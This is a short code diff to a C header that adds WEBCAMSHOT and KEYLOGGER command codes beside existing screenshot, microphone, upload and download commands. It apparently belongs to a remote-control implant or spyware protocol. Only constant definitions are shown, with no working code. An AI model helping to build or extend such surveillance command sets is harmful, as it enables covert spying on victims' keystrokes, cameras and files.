@@ -35,6 +35,8 @@
 #define CAT_CMD         0x46        // TODO: Might not do
 #define SCREENSHOT_CMD    0x47
 #define MICROPHONE_CMD    0x48
+#define WEBCAMSHOT_CMD      0x49
+#define KEYLOGGER_CMD      0x58
 // Special
 #define UPLOAD_CMD      0x50
 #define DOWNLOAD_CMD    0x51
